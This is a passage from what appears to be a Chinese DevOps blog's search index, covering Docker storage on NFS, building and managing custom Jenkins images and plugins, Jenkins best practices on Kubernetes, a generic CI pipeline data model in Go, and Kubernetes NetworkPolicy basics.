docker.io/library/alpine 5843afab3874: Downloading [===========\u0026gt; ] 527.5 kB/2.277 MB 拉取镜像层时，卡主。反复重试，报错:\n1 failed to register layer: symlink ../cb97a0b3d4bea7e66b3f205092b57707774397b9f917254b154721fc80c1f60c/diff /var/lib/docker/overlay2/l/PVQUL6KR6X3V3ZXM2DDE55KOMJ: no such file or directory 清理环境 1 systemctl stop docker 1 umount /root/overlay2 1 rm -rf /var/lib/docker/* 1 systemctl start docker 小结 挂载 /var/lib/docker/overlay2 无法拉取镜像，能下载到内存，但是无法保存到 NFS 存储中。\n6. 总结 本次测试使用的 Docker 版本为 20.10.6，不能将 /var/lib/docker 挂载远程存储使用。主要原因是容器的实现依赖于内核的能力(xttrs)，而类似 NFS Server 这种远程存储无法提供这些能力。如果采用 Device Mapper 进行映射，使用磁盘挂载存在可行性，但只能用于迁移而不能实现共享。\n7. 参考 https://serverfault.com/questions/763805/how-to-place-docker-images-ontop-of-an-nfs-share-in-coreos ","description":"","id":217,"section":"post","tags":["博文","Docker","容器","存储","Kubernetes","能不能"],"title":"/var/lib/docker 能不能挂载远端存储","uri":"https://www.chenshaowen.com/blog/can-we-mount-var-lib-docker-to-remote-storage.html"},{"content":"1. 如何部署 Jenkins 为了方面进行下面的测试，先介绍两种部署 Jenkins 的方式，这里使用的是 shaowenchen/jenkins:2.277.4 镜像。在生产环境中，需要替换为官方 jenkins/jenkins 镜像或自己定制的镜像。\n1.1 docker-compose 运行 docker-compose.yaml 文件\nversion: \u0026#39;3\u0026#39; services: jenkins: image: shaowenchen/jenkins:2.277.4 container_name: jenkins restart: always network_mode: \u0026#34;bridge\u0026#34; environment: - JAVA_OPTS=\u0026#34;-Xms1Gi -Xmx4Gi\u0026#34; ports: - 8080:8080 - 50000:50000 - 2222:2222 environment: TZ: Asia/Shanghai volumes: - /Volumes/Data/jenkins_home:/var/jenkins_home 在本地创建一个目录 /Volumes/Data/jenkins_home 用于存储 Jenkins 的数据，8080 端口用于 Web 页面访问、50000 端口用于连接 Agent、2222 端口用于 SSH 管理 Jenkins。\n1 docker-compose up 运行命令之后，在滚动的日志中可以看到 admin 用户的初始化密码。我在本地使用的就是这种部署方式。\n1.2 Kubernetes 上部署 创建配置文件 values.yaml 文件\nmaster: image: \u0026#34;shaowenchen/jenkins\u0026#34; tag: \u0026#34;2.277.4\u0026#34; serviceType: NodePort nodePort: 38080 adminPassword: password imagePullPolicy: \u0026#34;Always\u0026#34; resources: requests: cpu: \u0026#34;1\u0026#34; memory: \u0026#34;2Gi\u0026#34; limits: cpu: \u0026#34;4\u0026#34; memory: \u0026#34;4Gi\u0026#34; installPlugins: [] persistence: enabled: true size: \u0026#34;10Gi\u0026#34; 在 installPlugins 配置项，可以指定 Jenkins 启动时，需要安装的插件列表。\n添加 Helm 源 1 2 helm repo add stable https://charts.helm.sh/stable helm repo update 安装 Jenkins 1 helm install jenkins stable/jenkins -f ./values.yaml --namespace default 卸载 Jenkins 1 helm uninstall jenkins --namespace default 2. 使用 CLI 管理 Jenkins 这里介绍两种方式，可以用于在命令行管理 Jenkins。 Jenkins 同时支持 SSH 和 Http 协议的 CLI 管理。\n2.1 第一种，通过 SSH 生成 ssh-key 密钥对 1 ssh-keygen -t rsa 查看公钥 1 cat ~/.ssh/id_rsa.pub 在 Jenkins 中添加 SSH 公钥 Jenkins -\u0026gt; 用户 -\u0026gt; 设置 -\u0026gt; SSH Public Keys -\u0026gt; 保存\n指定 SSHD 端口 系统管理 -\u0026gt; 全局安全配置 -\u0026gt; SSH Server，指定端口 -\u0026gt; 保存\n这里使用的是 2222 端口，可以根据自己的需要进行配置。\n使用 SSH 远程管理 Jenkins 这里使用的是 Jenkins 默认的管理员账户 admin\n1 2 3 ssh -l admin -p 2222 localhost version 2.277.4 2.2 第二种，通过客户端 http://localhost:8080/ 是 Jenkins 的访问页面，而在页面地址 http://localhost:8080/jnlpJars/jenkins-cli.jar 可以下载 Jenkins 客户端工具。\n不同的 Jenkins 版本之间，CLI 工具可能存在不兼容，建议下载当前环境下的客户端工具。这里的 xxx 指的是 admin 用户在页面的登录密码，也可以是用户生成的 API Token。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 java -jar jenkins-cli.jar -s http://localhost:8080/ -auth admin:xxx help add-job-to-view Adds jobs to view. apply-configuration Apply YAML configuration to instance build Builds a job, and optionally waits until its completion. cancel-quiet-down Cancel the effect of the \u0026#34;quiet-down\u0026#34; command. check-configuration Check YAML configuration to instance clear-queue Clears the build queue. connect-node Reconnect to a node(s) console Retrieves console output of a build. copy-job Copies a job. create-credentials-by-xml Create Credential by XML create-credentials-domain-by-xml Create Credentials Domain by XML create-job Creates a new job by reading stdin as a configuration XML file. create-node Creates a new node by reading stdin as a XML configuration. create-view Creates a new view by reading stdin as a XML configuration. declarative-linter Validate a Jenkinsfile containing a Declarative Pipeline delete-builds Deletes build record(s). delete-credentials Delete a Credential delete-credentials-domain Delete a Credentials Domain delete-job Deletes job(s). delete-node Deletes node(s) delete-view Deletes view(s). disable-job Disables a job. disable-plugin Disable one or more installed plugins. disconnect-node Disconnects from a node. enable-job Enables a job. enable-plugin Enables one or more installed plugins transitively. export-configuration Export jenkins configuration as YAML get-credentials-as-xml Get a Credentials as XML (secrets redacted) get-credentials-domain-as-xml Get a Credentials Domain as XML get-job Dumps the job definition XML to stdout. get-node Dumps the node definition XML to stdout. get-view Dumps the view definition XML to stdout. groovy Executes the specified Groovy script. groovysh Runs an interactive groovy shell. help Lists all the available commands or a detailed description of single command. import-credentials-as-xml Import credentials as XML. The output of \u0026#34;list-credentials-as-xml\u0026#34; can be used as input here as is, the only needed change is to set the actual Secrets which are redacted in the output. install-plugin Installs a plugin either from a file, an URL, or from update center. keep-build Mark the build to keep the build forever. list-changes Dumps the changelog for the specified build(s). list-credentials Lists the Credentials in a specific Store list-credentials-as-xml Export credentials as XML. The output of this command can be used as input for \u0026#34;import-credentials-as-xml\u0026#34; as is, the only needed change is to set the actual Secrets which are redacted in the output. list-credentials-context-resolvers List Credentials Context Resolvers list-credentials-providers List Credentials Providers list-jobs Lists all jobs in a specific view or item group. list-plugins Outputs a list of installed plugins. mail Reads stdin and sends that out as an e-mail. offline-node Stop using a node for performing builds temporarily, until the next \u0026#34;online-node\u0026#34; command. online-node Resume using a node for performing builds, to cancel out the earlier \u0026#34;offline-node\u0026#34; command. quiet-down Quiet down Jenkins, in preparation for a restart. Don’t start any builds. reload-configuration Discard all the loaded data in memory and reload everything from file system. Useful when you modified config files directly on disk. reload-jcasc-configuration Reload JCasC YAML configuration reload-job Reload job(s) remove-job-from-view Removes jobs from view. replay-pipeline Replay a Pipeline build with edited script taken from standard input restart Restart Jenkins. restart-from-stage Restart a completed Declarative Pipeline build from a given stage. safe-restart Safely restart Jenkins. safe-shutdown Puts Jenkins into the quiet mode, wait for existing builds to be completed, and then shut down Jenkins. session-id Outputs the session ID, which changes every time Jenkins restarts. set-build-description Sets the description of a build. set-build-display-name Sets the displayName of a build. set-external-build-result Set external monitor job result. shutdown Immediately shuts down Jenkins server. stop-builds Stop all running builds for job(s) support Generates a diagnostic support bundle. update-credentials-by-xml Update Credentials by XML update-credentials-domain-by-xml Update Credentials Domain by XML update-job Updates the job definition XML from stdin. The opposite of the get-job command. update-node Updates the node definition XML from stdin. The opposite of the get-node command. update-view Updates the view definition XML from stdin. The opposite of the get-view command. version Outputs the current version. wait-node-offline Wait for a node to become offline. wait-node-online Wait for a node to become online. who-am-i Reports your credential and permissions. CLI 工具基本包含了对流水线任务、节点、凭证，还有 Jenkins 的管理功能，能够覆盖大部分的运维场景需求。\n3. 定制 Jenkins 版本 3.1 下载 custom-war-packager-cli 工具 访问地址 https://repo.jenkins-ci.org/list/releases/io/jenkins/tools/custom-war-packager/custom-war-packager-cli/ ，下载最新版本的 custom-war-packager 工具，注意选择带 with-dependencies 的包。\n这里我下载的版本是 2.0-alpha-5\n1 wget https://repo.jenkins-ci.org/list/releases/io/jenkins/tools/custom-war-packager/custom-war-packager-cli/2.0-alpha-5/custom-war-packager-cli-2.0-alpha-5-jar-with-dependencies.jar -O custom-war-packager-cli.jar 3.2 定制化 Jenkins 具体配置可以参考：https://github.com/jenkinsci/custom-war-packager/ 。下面是一份我的测试配置：\nconfig.yaml 文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 bundle: groupId: com.dev artifactId: \u0026#34;jenkins\u0026#34; description: \u0026#34;Jenkins Custom With Package\u0026#34; vendor: \u0026#34;Jenkins Project\u0026#34; buildSettings: docker: base: jenkins/jenkins:2.277.4 tag: shaowenchen/jenkins:2.277.4 build: true war: groupId: org.jenkins-ci.main artifactId: jenkins-war source: version: 2.277.4 plugins: - groupId: io.jenkins artifactId: configuration-as-code source: version: 1.47 这里主要关注两个点：buildSettings 和 plugins。也可以指定 CasC 文件。\nbuildSettings，指定构建产物。这里的意思是基于 jenkins/jenkins:2.277.4 镜像，打包出 shaowenchen/jenkins:2.277.4 镜像。 plugins，指定需要下载的插件列表。 下面进行编译镜像：\n1 java -jar ./custom-war-packager-cli.jar --installArtifacts -configPath=./config.yaml 这样一个定制化的 Jenkins 镜像就产生了，直接运行 shaowenchen/jenkins:2.277.4，无需安装，就已经内置了 configuration-as-code 插件。\n4. 如何给 Jenkins 添加新的插件 4.1 第一种，通过页面搜索或离线上传 打开 Jenkins 的插件管理页面，直接在线搜索。\n然后，点击安装即可。\n官方默认的插件来源是 https://updates.jenkins.io/update-center.json 。如果访问不够快，可以修改为其他源。在插件管理 -\u0026gt; 高级 -\u0026gt; 升级站点中，将 URL 替换为 https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json 即可。\n另一种方式是离线上传，但是 Jenkins 的插件之间会有依赖，离线上传得上传全部依赖包，比较麻烦，不推荐使用。在离线环境，可以将依赖的插件列表整理到文本，然后使用 plugin-installation-manager-tool 下载之后，通过 Nginx 提供插件源。\n4.2 第二种，通过 CLI 工具 前面提到通过 CLI 工具可以管理 Jenkins，其中就包括插件的管理。\n使用客户端的 install-plugin 子命令安装指定的插件 1 java -jar jenkins-cli.jar -s http://localhost:8080/ -auth admin:xxx install-plugin blueocean-web:1.24.7 重启 Jenkins 生效 1 java -jar jenkins-cli.jar -s http://localhost:8080/ -auth admin:xxx restart 但这种方式并不能解决插件依赖冲突问题。也就是当新插件 A 依赖插件 B 的最新版本时，B 插件不会自动被更新，这会导致新插件不可用。如果直接升级 B ，又可能导致其他依赖于 B 的插件不可用。这里需要进行版本依赖的判定。\n4.3 第三种，通过 custom-war-packager 通过前面的学习，我们知道只需要在 config.yaml 文件中添加新的插件即可。\n1 2 3 4 5 6 7 8 9 plugins: - groupId: io.jenkins artifactId: configuration-as-code source: version: 1.47 - groupId: io.jenkins.blueocean artifactId: blueocean-web source: version: 1.24.7 接着重新编译打包，但是发现插件并不能正常工作，同样是没有解决插件依赖冲突问题。\n根据页面提示，我们需要升级一个依赖包 Snakeyaml API Plugin 从 1.26.4 到 1.27.0。这时，只需要将其明文写在 config.yaml 文件中即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 plugins: - groupId: io.jenkins artifactId: configuration-as-code source: version: 1.47 - groupId: io.jenkins.blueocean artifactId: blueocean-web source: version: 1.24.7 - groupId: io.jenkins.plugins artifactId: snakeyaml-api source: version: 1.27.0 再次编译构建之后，Jenkins 就可以正常运行了。\n5. 总结 作为一个存在十多年的编排引擎，Jenkins 具有很大的先发优势，在插件生态、周边工具建设方面十分完善。\n本文主要是介绍了几个不常用，但有用的功能：\nJenkins CLI 工具。通过命令行工具，管理 Jenkins 是一个有意思的地方，可以很方便地进行自动化集成。 custom-war-packager 定制镜像。将插件、配置等 Jenkins 依赖的内容打包成一个整体，用于部署，能够很好管理运行环境。 但这两种方式在插件兼容方面都没有很好适配，需要人为干预。\n","description":"","id":218,"section":"post","tags":["博文","DevOps","CICD","Jenkins"],"title":"如何定制自己的 Jenkins 镜像","uri":"https://www.chenshaowen.com/blog/how-to-customize-your-jenkins.html"},{"content":"\n1. 配置较大的 -Xms -Xmx 参数 Jenkins 是由 Java 编写的编排引擎, 在 Full GC 时会 Stop The World(STW)。在大规模构建时, STW 可能会导致 Jenkins 无法处理新的请求。\n为了避免频繁的 STW, 同时增大并发量, 建议设置较大的堆, -Xms3g -Xmx6g -XX:MaxRAM=6g。具体数值可以根据监控值来设置, Java Full GC 之后, 内存占用会陡降。\n2. request 不要设置太小 request 设置太小, 可能会导致 Jenkins 运行起来之后, 节点资源不足, 引发驱逐, 甚至压垮节点。\nrequest 应该接近真实值, 如果有足够的机器资源, 应该配置亲和性, 让 Jenkins 尽可能运行在单独的机器上。request \u0026gt;= 1.25 * JVM 最大堆内存, limit \u0026gt;= 2 * JVM 最大堆内存。\n3. IO 性能不能差 Jenkins 使用磁盘文件存储数据, 每条流水线、每次构建都会占用一个文件目录, 产生大量文件。通常流水线数量有限, 但在构建历史达到 10000+ 级别时, 会感受到 IO 对 Jenkins 的影响。\n如果使用本地存储, 推荐使用高性能的 SSD。如果是使用网络存储, 需要高性能的网络支持, 同时加大客户端的缓存池。\n4. 较大的 jenkins_home 的磁盘空间 磁盘满时, Jenkins 将不能工作, 在 Jenkins 后台会有错误提示。\n建议对 Jenkins 的工作目录进行磁盘使用率监控, 并配置告警规则。如果没有监控告警系统, 那么建议直接设置一个较大的磁盘空间给 /var/jenkins_home 目录。因为有一些 Storage Class 不支持动态扩容, 当磁盘满时, 就只能手动拷贝迁移了。\n5. 使用 Kubernetes plugin 在 Kuberntes 上构建 基于物理机、虚拟机的构建, 增加了运维成本、限制了并发的数量。\n使用 Kubernetes plugin 插件在 Kubernetes 上进行构建能充分利用云原生易扩展、易维护的优势, 进行大规模的构建。参考：在 Kubernetes 上动态创建 Jenkins Slave 。由于构建比较占用资源, 为了避免对集群的影响, 可以配置亲和性, 将构建 Pod 集中到指定的节点执行。\n6. 使用 CasC 管理 Jenkins 的配置 通过 Jenkins 页面进行各种构建、安全等配置, 不仅繁琐、不易维护, 而且不能够复用。\n使用 CasC 插件, 允许用户将 Jenkins 的配置, 通过文本的形式进行描述, 还可以放置到 Git 仓库中进行版本管理。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 jenkins: securityRealm: ldap: configurations: - groupMembershipStrategy: fromUserRecord: attributeName: \u0026#34;memberOf\u0026#34; inhibitInferRootDN: false rootDN: \u0026#34;dc=acme,dc=org\u0026#34; server: \u0026#34;ldaps://ldap.acme.org:1636\u0026#34; nodes: - permanent: name: \u0026#34;static-agent\u0026#34; remoteFS: \u0026#34;/home/jenkins\u0026#34; launcher: jnlp: workDirSettings: disabled: true failIfWorkDirIsMissing: false internalDir: \u0026#34;remoting\u0026#34; workDirPath: \u0026#34;/tmp\u0026#34; slaveAgentPort: 50000 agentProtocols: - \u0026#34;jnlp2\u0026#34; 7. 使用 Custom WAR Packager 打包 Jenkins 在部署一套新的 Jenkins 环境时, 会需要安装大量插件, 非常影响部署速度, 同时插件是否能正常下载也存在不确定性。\nCustom WAR Packager 允许用户将 Jenkins 、配置、插件打包成一个完整的 war 包或者镜像。这样无论是开发测试, 还是线上部署, 都可以很方便的部署, 并且环境一致, 而用户只需要写一个 yaml 文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 bundle: groupId: com.dev artifactId: \u0026#34;jenkins\u0026#34; description: \u0026#34;Jenkins Custom With Package\u0026#34; vendor: \u0026#34;Jenkins Project\u0026#34; buildSettings: docker: base: jenkins/jenkins:2.277.4 tag: shaowenchen/jenkins:2.277.4 build: true war: groupId: org.jenkins-ci.main artifactId: jenkins-war source: version: 2.277.4 plugins: - groupId: io.jenkins artifactId: configuration-as-code source: version: \u0026#34;1.47\u0026#34; libPatches: - groupId: \u0026#34;org.jenkins-ci.main\u0026#34; artifactId: \u0026#34;remoting\u0026#34; source: git: https://github.com/jenkinsci/remoting.git systemProperties: { jenkins.model.Jenkins.slaveAgentPort: \u0026#34;50000\u0026#34;, jenkins.model.Jenkins.slaveAgentPortEnforce: \u0026#34;true\u0026#34;} groovyHooks: - type: \u0026#34;init\u0026#34; id: \u0026#34;initScripts\u0026#34; source: dir: scripts casc: - id: \u0026#34;jcasc-config\u0026#34; source: dir: jenkins.yml 8. Jenkins Shared Libraries 在使用 Groovy 编写 Pipeline 的过程中, 经常会有大量重复代码。\nJenkins 共享库提供函数级别的共享, 可以在不同流水线之间复用同一套函数逻辑, 对于平台建设、大规模使用场景适用。不仅能加快 Pipeline 编写, 还方便维护、平滑升级。\n1 2 3 4 5 @Library(\u0026#39;utils\u0026#39;) import org.foo.Utilities def utils = new Utilities(this) node { utils.mvn \u0026#39;clean package\u0026#39; } 9. 定期重启 Jenkins Master 虽然你会做很多的优化, 但是最后发现重启依然能解决很多的问题。\n每隔一段时间, 大约一个月, 就会 Agent 连不上, 构建并发上不去, 失败率增加等问题。这是重启一下 Jenkins Master 服务, CICD 系统又恢复了正常, 只是整个服务中断了几分钟。\n因此, 在没有多个 Jenkins Master 可以切换时, 定期告诉用户, 需要停机短暂维护, 非常有用。\n10. 参考 https://www.jenkins.io/zh/doc/book/pipeline/shared-libraries/ https://github.com/jenkinsci/configuration-as-code-plugin https://github.com/jenkinsci/custom-war-packager https://zhuanlan.zhihu.com/p/370241822 ","description":"","id":219,"section":"post","tags":["博文","DevOps","CICD","Jenkins"],"title":"Jenkins 在 Kubernetes 上的最佳实践","uri":"https://www.chenshaowen.com/blog/best-practices-for-jenkins-on-kubernetes.html"},{"content":"1. 解耦引擎释放流水线能力 在设计系统时，我们常面临两难。是内敛复杂度，对外提供单一易用的功能；还是释放复杂度，将灵活归还用户。这非常考验产品能力。\n设计 CICD 系统时，我们可以直接将 Jenkinsfile、PipelineRun 等概念直接抛给用户，让用户自己学习相关领域的知识，再来使用产品。当然，也可以继续抽象，在人与系统之间建立模型，实现意识与指令的转换。我们想要更加易用的产品，因此选择屏蔽底层概念，继续抽象、建模。\n从 Jenkins 、GitLab CI，再到 GitHub Actions、Tekton，新的基础设施总会有各种各样的基础组件涌现。我们想减少这种切换的成本，在各种引擎之间能够切换。技术在不断地更替，但我们想对用户保持一致。\n虽然流水线相关技术在快速演进，但执行这件事的终究是人。人的知识是有传承的，无论技术怎样变化，做流水线引擎的社区是相对稳定的，都是有交集的一群人。这给解耦引擎，设计通用流水线提供了可能。\n2. 流水线的数据模型 在很多 CICD 引擎中，能够找到相似的概念。\nJenkins 流水线包含很多个 Stage，而 Stage 中的 steps 包含多个串行执行的脚本。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 pipeline { agent any stages { stage(\u0026#39;Build\u0026#39;) { steps { echo \u0026#39;Building-1..\u0026#39; echo \u0026#39;Building-2..\u0026#39; } } stage(\u0026#39;Test\u0026#39;) { steps { echo \u0026#39;Testing..\u0026#39; } } stage(\u0026#39;Deploy\u0026#39;) { steps { echo \u0026#39;Deploying....\u0026#39; } } } } GitLab CI 流水线包含 build、test 两个 串行的 Stage，每个 Stage 包含若干并行执行的 Job 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 stages: - build - test build-code-job: stage: build script: - echo \u0026#34;Check the ruby version, then build some Ruby project files:\u0026#34; - ruby -v - rake test-code-job1: stage: test script: - echo \u0026#34;If the files are built successfully, test some files with one command:\u0026#34; - rake test1 test-code-job2: stage: test script: - echo \u0026#34;If the files are built successfully, test other files with a different command:\u0026#34; - rake test2 GitHub Actions 流水线由 jobs 定义，一个流水线有很多个可能的 job（示例中的 build 构成），每个 job 又包含很多串行的 steps。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 name: Octo Organization CI on: push: branches: [ $default-branch ] pull_request: branches: [ $default-branch ] jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 - name: Run a one-line script run: echo Hello from Octo Organization 基于以上的示例，我们对 Pipeline 进行抽象。\n1 2 3 4 5 6 7 - pipeline - stage-1 - step-1-1 - step-1-2 - stage-2 - step-2-1 - ... 如下图，一个流水线包含若干个 Stage, Stage 可以并行或者串行。Stage 中包含若干个串行的 Step 执行脚本。而在 Tekton 中，Stage 对应着 Task 。\n一个流水线的运行时，可以是一个 Kubernetes 集群、一个物理机、一个 Container 环境等。\n一个 Stage 的运行时，可能是一个 Pod、一个物理机、一个 Container 环境等。\n一个 Step 有一个工作空间，然后执行 Shell Script。\n流水线并不需要复杂的定义，即使几个简单的脚本，也可以编排复杂的逻辑。但是对流水线进行抽象和建模，有利于插件(Step)扩展，流水线产品本身的开发和维护。\n流水线会经过一系列的 Manager 处理，与特定的运行时、执行引擎、凭证等关联起来。最终渲染出引擎接受的流水线描述，例如 Jenkins 的 Jenkinsfile、Tekton 的 Yaml。\n3. 代码层的数据模型 下面给出核心数据结构的主要字段:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 // 定义运行时 type Runtime struct { Name string Provider interface{} } // 定义引擎 type Engine string // 定义作用域，分为三个层级。 type Scope string const ( ScopePipeline Scope = \u0026#34;Pipeline\u0026#34; ScopeStage Scope = \u0026#34;Stage\u0026#34; ScopeStep Scope = \u0026#34;Step\u0026#34; ) // 定义参数结构 type ParamSpec struct { Name string `json:\u0026#34;name\u0026#34;` Scope ParamType `json:\u0026#34;type,omitempty\u0026#34;` Default interface{} `json:\u0026#34;default,omitempty\u0026#34;` } // 定义插件模板 type Step struct { Name string `json:\u0026#34;name\u0026#34;` Params []ParamSpec `json:\u0026#34;params,omitempty\u0026#34;` Script string `json:\u0026#34;script,omitempty\u0026#34;` Engine string `json:\u0026#34;engine\u0026#34;` Workspace string `json:\u0026#34;workspace,omitempty\u0026#34;` } // 定义组装流水线之后，插件(Step)相关字段 type PipelineStep struct { Name string `json:\u0026#34;name,omitempty\u0026#34;` StepRef string `json:\u0026#34;StageRef,omitempty\u0026#34;` Params []Param `json:\u0026#34;params,omitempty\u0026#34;` Status string `json:\u0026#34;status,omitempty\u0026#34;` Workspace string `json:\u0026#34;workspace,omitempty\u0026#34;` } // 定义 Stage ，主要是一系列的 Steps type Stage struct { ObjectMeta `json:\u0026#34;metadata\u0026#34;` Spec StageSpec `json:\u0026#34;spec\u0026#34;` } type StageSpec struct { Description string `json:\u0026#34;description,omitempty\u0026#34;` Params []ParamSpec `json:\u0026#34;params,omitempty\u0026#34;` Steps []PipelineStep `json:\u0026#34;steps,omitempty\u0026#34;` Workspace string `json:\u0026#34;workspace,omitempty\u0026#34;` } // 定义组装流水线之后，阶段(Stage)相关字段 type PipelineStage struct { Name string `json:\u0026#34;name,omitempty\u0026#34;` StageRef Stage `json:\u0026#34;stageRef,omitempty\u0026#34;` Params []Param `json:\u0026#34;params,omitempty\u0026#34;` Workspace string `json:\u0026#34;workspace,omitempty\u0026#34;` Status string `json:\u0026#34;status,omitempty\u0026#34;` Runtime *Runtime } // 定义流水线的结构 type Pipeline struct { ObjectMeta `json:\u0026#34;metadata\u0026#34;` Spec PipelineSpec `json:\u0026#34;spec\u0026#34;` } type PipelineSpec struct { Params []ParamSpec `json:\u0026#34;params,omitempty\u0026#34;` Stages []PipelineStage `json:\u0026#34;stages,omitempty\u0026#34;` Workspace string `json:\u0026#34;workspace,omitempty\u0026#34;` } // 定义运行一条流水线相关的字段 type PipelineRun struct { ObjectMeta `json:\u0026#34;metadata,omitempty\u0026#34;` Spec PipelineRunSpec `json:\u0026#34;spec,omitempty\u0026#34;` Status string `json:\u0026#34;status,omitempty\u0026#34;` } type PipelineRunSpec struct { PipelineRef string `json:\u0026#34;pipelineRef,omitempty\u0026#34;` Params []Param `json:\u0026#34;params,omitempty\u0026#34;` Runtime *Runtime } 在代码层面，需要注意两点:\n模板与实例。模板是系统内置的引擎相关的框架或片段，例如 Step、Stage、Pipeline ;而实例是填充个性化参数之后的模板或片段，PipelienStep、PipelineStage、PipelineRun 。 作用范围。参数中有一个字段 Scope ，用于表示参数在什么范围可见。实际上，真正使用参数的是 Step，但是组装之后 Stage 作用域的参数会被提升到 Stage 中。同理，Pipeline 作用域的参数会被提升到 Pipeline 中。参数在不同的层级会有不同的用处，从内向外抽取，从外向内注入。 4. 流水线运行时的数据与交互 上面是一个流水线的执行流程，可以对照着每个步骤查看，这里不再重复。下面主要以不同角色的视角描述流水线的运行。\n4.1 系统内置 Step 插件模板 首先需要在系统中内置一些常用的插件 Script。\n例如，Jenkins 的 Git Clone 插件\n1 git(url: \u0026#39;${param.git_repo}\u0026#39;, credentialsId: \u0026#39;${param.ssh-key}\u0026#39;, branch: \u0026#39;${param.branch}\u0026#39;, changelog: true, poll: false) Jenkins 的构建并推送镜像。\n1 2 3 4 5 withCredentials([usernamePassword(passwordVariable : \u0026#39;DOCKER_PASSWORD\u0026#39; ,usernameVariable : \u0026#39;DOCKER_USERNAME\u0026#39; ,credentialsId : \u0026#34;${param.credential_id}\u0026#34; ,)]) { sh \u0026#39;echo \u0026#34;$DOCKER_PASSWORD\u0026#34; | docker login ${param.registry_server} -u \u0026#34;$DOCKER_USERNAME\u0026#34; --password-stdin\u0026#39; sh \u0026#39;docker push ${param.image_name}\u0026#39; sh \u0026#39;docker logout\u0026#39; } Jenkins 执行脚本。\n1 sh \u0026#39;${param.script_content}\u0026#39; 当然也可以是其他引擎的插件片段，但主要是脚本片段 + 参数注入，因此不再列举。\n4.2 创建流水线时，用户视角 如上图，用户首先会根据用户选择的引擎，得到一个 Step 模板列表。然后通过编排，将 Step 组装成一个流水线。\n其中，Step-1、2、3 表示的是选择一个模板 Step 并初始化参数的实例。然后组装出 Pipeline 的数据结构保存在后端。\n如果是使用模板进行创建，那么只需要提前帮用户初始化 Pipeline 数据结构即可。\n4.3 创建流水线，开发人员视角 前端研发 请求 Step 模板列表之后，根据用户输入的实例化参数，组装 Pipeline 结构。\n后端研发 将用户的 Pipeline 数据保存之后，根据 Step 模板信息，将 Pipeline 渲染成引擎需要的流水线描述。例如，生成 Jenkinsfile 文件，同步到 Jenkins 创建流水线。\n4.4 运行时，数据流向及交互 执行流水线 前端调用后端接口，获取 Pipeline 的定义，将 Pipeline 级别的参数弹框，让用户输入相关的参数。点击确认后，创建 PipelineRun 对象。\n后端根据 PipelineRun 对象，触发引擎的执行接口，将 PipelineRun 中定制化的参数传入流水线执行。\n查看流水线 PipelineRun 即为流水线的执行历史，需要从引擎中查询流水线的状态，并写入 PipelineRun 对象。\n再次运行、暂停、继续、审批 在 PipelineRun 中记录有某次执行的全部记录，包括参数、Pipeline 定义。因此，只要引擎支持上述功能，都可以实现。\n","description":"","id":220,"section":"post","tags":["博文","CloudNative","DevOps","CICD"],"title":"一个通用流水线设计","uri":"https://www.chenshaowen.com/blog/a-universal-design-for-pipeline.html"},{"content":"1. Kubernetes 中的网络隔离 Kuberntes 自 1.3 引入了 Network Policy（网络策略） ，通过 ipBlock、podSelector、namespaceSelector 定义实体，控制其 From（Ingress）、To（Egress）的流量行为。\n但 Kubernetes 只是定义了网络策略，具体实现依赖网络插件。目前，Calico、Cilium、Weave Net 等网络插件都支持网络隔离功能。\n不同的 Kubernetes 版本对网络隔离支持的程度不一样。1.3~1.6 需要在 kube-apiserver 中开启 extensions/v1beta1/networkpolicies ，1.7 之后可以直接使用，1.8 新增了 Egress 、IPBlock 支持。\n如果没有配置任何网络策略，默认情况下流量行为将没有任何限制。\n2. 网络隔离对象的字段属性 下面是官方文档中的示例:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: test-network-policy namespace: default spec: podSelector: matchLabels: role: db policyTypes: - Ingress - Egress ingress: - from: - ipBlock: cidr: 172.17.0.0/16 except: - 172.17.1.0/24 - namespaceSelector: matchLabels: project: myproject - podSelector: matchLabels: role: frontend ports: - protocol: TCP port: 6379 egress: - to: - ipBlock: cidr: 10.0.0.0/24 ports: - protocol: TCP port: 5978 为了更直观地看到网络策略的组成，我画了一张示意图:\n一个 NetworkPolicy 包含四个部分:\n需要控制的 Pods 策略类型，Ingress、Egress 可选 Ingress 策略，包括 Entity 和端口、协议定义 Egress 策略，包括 Entity 和端口、协议定义 其中的 Entity 有三种类型可选，ipBlock 指定一个 IP 范围，namespaceSelector 指定匹配的命名空间，podSelector 指定匹配的 Pods 。\n如果针对同一个实体，定义了多个 NetworkPolicy，那么命中其中一项即可通行。\n3. 网络隔离示例 在 Ingress 和 Egress 的配置过程中会遇到两个特殊对象 []，{}。如果是 []，那么表示不指向任何实体，通常用于禁用流量；而 {} 表示全部实体，通常用于放行流量。\n另外一个值得注意的地方是，列表表示或的关系。\n1 2 3 4 5 6 egress: - ports: - port: 443 protocol: TCP - to: - namespaceSelector: {} 表示允许全部的 443 